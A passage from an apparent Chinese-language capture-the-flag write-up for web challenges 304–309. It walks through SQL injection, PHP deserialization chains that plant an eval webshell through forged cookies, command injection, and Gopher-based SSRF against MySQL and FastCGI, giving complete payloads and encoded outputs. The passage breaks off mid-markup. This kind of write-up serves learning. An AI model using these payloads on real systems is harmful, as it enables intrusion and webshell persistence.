+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">结果为：sds_dpt,sds_flaag,sds_user</span><br></pre></td></tr></table></figure>
+
+<p>查字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;,sds_address=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;sds_flaag&#x27;)#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">结果为：flag</span><br></pre></td></tr></table></figure>
+
+<p>查字段值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;,sds_address=(select flag from sds_flaag)#</span><br></pre></td></tr></table></figure>
+
+<p>成功得到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808104039222.png"></p>
+<h3 id="web305"><a href="#web305" class="headerlink" title="web305"></a>web305</h3><p>下载附件分析代码，发现<code>fun.php</code>有个<code>sds_waf()</code>函数，过滤很严格，且应用到了<code>dptadd.php</code>，因此之前的SQL注入行不通</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808112135126.png"></p>
+<p>同时发现这题的<code>checklogin.php</code>相比web303多了个<strong>Cookie反序列化</strong></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808111710684.png"></p>
+<p>分析这个<code>class.php</code>，可以看到有<strong>文件写入操作</strong></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808111836466.png"></p>
+<p>因此这题的思路就是<strong>伪造Cookie</strong>，然后执行<strong>反序列化漏洞</strong>写入webshell</p>
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>))));</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%221.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D</span><br></pre></td></tr></table></figure>
+
+<p>把这个序列化结果写入Cookie，路径为<code>/checklogin.php</code></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: user=O%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%221.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808112833858.png"></p>
+<p>蚁剑连接webshell，注意要把https改成http</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808113224736.png"></p>
+<p>在目录找了一番，没找到flag，猜测flag是在数据库里面，用蚁剑连接数据库</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808113745465.png"></p>
+<p>点击<strong>添加配置</strong>，然后数据库类型选<strong>MYSQLI</strong>，MYSQLI是MYSQL的升级版，支持更多新特性和更高安全性，官方推荐使用，MYSQL扩展现已废弃</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808113822062.png"></p>
+<p>密码在<code>conn.php</code>，但是不知道为什么连不上，后来去网上搜了一下，发现蚁剑那里查看的密码是root，跟题目给的附件不一样</p>
+<p>这是附件里面的<code>conn.php</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808114410473.png"></p>
+<p>这是蚁剑里面的<code>conn.php</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808114450866.png"></p>
+<p>然后在添加配置那里输入账号密码即可</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808114546586.png"></p>
+<p>成功找到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808114621457.png"></p>
+<h3 id="web306"><a href="#web306" class="headerlink" title="web306"></a>web306</h3><p>下载附件分析代码，发现<code>class.php</code>有个<strong>文件写入操作</strong></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808140158580.png"></p>
+<p>继续分析，在<code>index.php</code>发现反序列化代码</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808140322770.png"></p>
+<p>因此我们可以构造一个利用链执行反序列化操作，在<code>dao.php</code>中发现可利用的类</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808141029596.png"></p>
+<p>最终利用链为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[index.php] unserialize -&gt; [dao.php] dao::__destruct() -&gt; [class.php] log::close()</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;conn=<span class="keyword">new</span> <span class="title function_ invoke__">log</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$title</span>=<span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$info</span>=<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzozOiJkYW8iOjE6e3M6OToiAGRhbwBjb25uIjtPOjM6ImxvZyI6Mjp7czo1OiJ0aXRsZSI7czo1OiIxLnBocCI7czo0OiJpbmZvIjtzOjI0OiI8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4iO319</span><br></pre></td></tr></table></figure>
+
+<p>把结果写入Cookie即可，路径是<code>/index.php</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808142513037.png"></p>
+<p>然后蚁剑连接webshell，成功找到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808142602645.png"></p>
+<h3 id="web307"><a href="#web307" class="headerlink" title="web307"></a>web307</h3><p>下载附件分析代码，发现<code>class.php</code>有个文件写入操作</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808152937306.png"></p>
+<p>但是找了一番并没有发现调用<code>closelog()</code>的地方，因此这个方法行不通</p>
+<p>继续分析代码，发现<code>dao.php</code>有个<strong>命令执行函数</strong></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808153155228.png"></p>
+<p>在<code>logout.php</code>发现反序列化代码，且调用了<code>clearCache()</code>函数</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808153515278.png"></p>
+<p>虽然<code>logout.php</code>并没有直接包含<code>dao.php</code>，但是包含了<code>service.php</code>，而<code>service.php</code>包含了<code>dao.php</code>，因此可以直接通过<code>dao</code>类调用<code>clearCache()</code>函数</p>
+<p>然后控制变量<code>$cache_dir</code>来截断原来的<code>rm</code>命令并执行新的命令，写入webshell到php文件</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808155827562.png"></p>
+<p>利用链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[/controller/logout.php] unserialize -&gt; [/controller/service/dao/dao.php] dao::clearCache()</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$cache_dir</span> = <span class="string">&#x27;1; echo &quot;&lt;?php eval(\$_POST[1]);?&gt;&quot; &gt; 1.php;&#x27;</span>;	<span class="comment">//&quot;$&quot;前加&quot;\&quot;是为了防止被解析</span></span><br><span class="line">&#125;	</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czo5OiJjYWNoZV9kaXIiO3M6NDQ6IjE7IGVjaG8gIjw/cGhwIGV2YWwoXCRfUE9TVFsxXSk7Pz4iID4gMS5waHA7Ijt9fQ==</span><br></pre></td></tr></table></figure>
+
+<p>把结果写入Cookie即可，路径是<code>/controller/logout.php</code>，参数是<code>service</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808154822481.png"></p>
+<p>然后蚁剑连接webshell，flag在<code>/var/www/html</code>目录</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808154953959.png"></p>
+<h3 id="web308"><a href="#web308" class="headerlink" title="web308"></a>web308</h3><p>下载附件分析代码，发现<code>dao.php</code>的<code>clearCache()</code>函数加了过滤，只能匹配纯英文字符，因此上题的方法在这里行不通</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808164149264.png"></p>
+<p>继续分析代码，发现<code>index.php</code>有反序列化代码，且调用了一个函数<code>checkVersion()</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808164314527.png"></p>
+<p>查找<code>checkVersion()</code>函数的定义，在<code>dao.php</code>里面</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808164507700.png"></p>
+<p>继续分析<code>update_url</code>，在<code>config.php</code>里面可以看到<code>$update_url</code>的定义，是个<strong>地址链接</strong></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808164645697.png"></p>
+<p>接着再分析<code>checkUpdate()</code>函数的定义</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808164846064.png"></p>
+<p><code>checkUpdate()</code>函数通过cURL发起HTTP请求，因此突破口就是这里，我们可以通过这个打<strong>SSRF漏洞</strong></p>
+<p>利用链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[index.php] unserialize -&gt; [/controller/service/dao/dao.php] dao::checkVersion()</span><br></pre></td></tr></table></figure>
+
+<p>看了一下，发现<code>config.php</code>里面并没有设置mysql密码</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808172158944.png"></p>
+<p>因此我们用<strong>Gopher协议</strong>打无密码的mysql，工具是<strong>Gopherus</strong>，下载地址：<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit mysql</span><br></pre></td></tr></table></figure>
+
+<p>输入以下内容</p>
+<p>数据库用户名：<code>root</code></p>
+<p>待执行命令：<code>select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;;</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808170349659.png"></p>
+<p>得到结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%46%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%3b%01%00%00%00%01</span><br></pre></td></tr></table></figure>
+
+<p>如果是直接传参就需要进行URL编码，但是这里是反序列化，解析payload时已经在服务端，因此不需要二次编码</p>
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line"> 	<span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%46%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%3b%01%00%00%00%01;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czo3NjQ6ImdvcGhlcjovLzEyNy4wLjAuMTozMzA2L18lYTMlMDAlMDAlMDElODUlYTYlZmYlMDElMDAlMDAlMDAlMDElMjElMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlNzIlNmYlNmYlNzQlMDAlMDAlNmQlNzklNzMlNzElNmMlNWYlNmUlNjElNzQlNjklNzYlNjUlNWYlNzAlNjElNzMlNzMlNzclNmYlNzIlNjQlMDAlNjYlMDMlNWYlNmYlNzMlMDUlNGMlNjklNmUlNzUlNzglMGMlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNmUlNjElNmQlNjUlMDglNmMlNjklNjIlNmQlNzklNzMlNzElNmMlMDQlNWYlNzAlNjklNjQlMDUlMzIlMzclMzIlMzUlMzUlMGYlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNzYlNjUlNzIlNzMlNjklNmYlNmUlMDYlMzUlMmUlMzclMmUlMzIlMzIlMDklNWYlNzAlNmMlNjElNzQlNjYlNmYlNzIlNmQlMDYlNzglMzglMzYlNWYlMzYlMzQlMGMlNzAlNzIlNmYlNjclNzIlNjElNmQlNWYlNmUlNjElNmQlNjUlMDUlNmQlNzklNzMlNzElNmMlNDYlMDAlMDAlMDAlMDMlNzMlNjUlNmMlNjUlNjMlNzQlMjAlMjIlM2MlM2YlNzAlNjglNzAlMjAlNjUlNzYlNjElNmMlMjglMjQlNWYlNTAlNGYlNTMlNTQlNWIlMzElNWQlMjklM2IlM2YlM2UlMjIlMjAlNjklNmUlNzQlNmYlMjAlNmYlNzUlNzQlNjYlNjklNmMlNjUlMjAlMjIlMmYlNzYlNjElNzIlMmYlNzclNzclNzclMmYlNjglNzQlNmQlNmMlMmYlMzElMmUlNzAlNjglNzAlMjIlM2IlMDElMDAlMDAlMDAlMDE7Ijt9fQ==</span><br></pre></td></tr></table></figure>
+
+<p>把结果写入Cookie即可，路径是<code>/index.php</code>，参数是<code>service</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808171238869.png"></p>
+<p>最后蚁剑连接webshell即可</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808171259237.png"></p>
+<h3 id="web309"><a href="#web309" class="headerlink" title="web309"></a>web309</h3><p>题目提示mysql有密码了，因此上题打无密码msql的方法在这里用不了</p>
+<p>附件还是和上题一样，这次可以用Gopher<strong>扫描端口</strong>试试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;gopher://127.0.0.1:端口&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+
+<p>常见危险端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">21 FTP</span><br><span class="line">22 SSH</span><br><span class="line">80 HTTP</span><br><span class="line">443 HTTPS</span><br><span class="line">3389 RDP</span><br><span class="line">1433 MS-SQL Server</span><br><span class="line">3306 MySQL</span><br><span class="line">6379 Redis</span><br><span class="line">9000 PHP-FPM / FastCGI</span><br></pre></td></tr></table></figure>
+
+<p>用Gopher请求端口时，如果端口有服务在监听，则会接受连接并等待我们传输数据，此时连接会“卡住”一段时间；如果端口没有服务，则会立刻拒绝连接。通过是否出现等待，就能判断端口是否开放</p>
+<p>方法跟之前一样，也是把结果写入Cookie，路径是<code>/index.php</code>，参数是<code>service</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808181225141.png"></p>
+<p>扫描到9000的时候未响应，说明<strong>9000端口开放</strong></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808181310245.png"></p>
+<p>可以用Gopher协议打<strong>FastCGI</strong>，工具也是<strong>Gopherus</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit fastcgi</span><br></pre></td></tr></table></figure>
+
+<p>输入以下内容</p>
+<p>已知文件绝对路径：<code>/var/www/html/index.php</code></p>
+<p>待执行命令：<code>echo &quot;&lt;?php eval(\$_POST[1]);?&gt;&quot; &gt; 1.php</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808183021767.png"></p>
+<p>得到结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH92%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5C%04%00%3C%3Fphp%20system%28%27echo%20%22%3C%3Fphp%20eval%28%5C%24_POST%5B1%5D%29%3B%3F%3E%22%20%3E%201.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH92%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5C%04%00%3C%3Fphp%20system%28%27echo%20%22%3C%3Fphp%20eval%28%5C%24_POST%5B1%5D%29%3B%3F%3E%22%20%3E%201.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 